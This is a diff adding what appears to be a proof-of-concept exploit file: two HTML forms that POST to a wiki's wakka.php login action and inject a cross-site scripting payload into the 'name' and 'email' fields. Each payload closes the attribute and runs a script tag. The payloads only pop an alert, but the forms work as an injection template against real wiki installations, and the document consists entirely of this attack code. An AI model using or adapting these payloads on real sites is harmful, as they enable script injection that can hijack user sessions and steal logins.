@@ -1,0 +1,26 @@
+&lt;form method=&quot;POST&quot; enctype=&quot;application/x-www-form-urlencoded&quot; action=&quot;http://www.example.com/wakka.php&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;wiki&quot; value=&quot;ParametresUtilisateur&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;login&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;&gt;&amp;quot;&gt;&lt;script&gt;alert(&#039;XSS Vulnerable&#039;);&lt;/script&gt;&quot;
+&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;submit&quot;&gt;
+
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;html&gt;
+&lt;body&gt;
+
+&lt;form method=&quot;POST&quot; enctype=&quot;application/x-www-form-urlencoded&quot; action=&quot;http://www.example.com/wakka.php&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;wiki&quot; value=&quot;ParametresUtilisateur&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;login&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&gt;&amp;quot;&gt;&lt;script&gt;alert(&#039;XSS Vulnerable&#039;);&lt;/script&gt;&quot;
+&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;submit&quot;&gt;
+
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
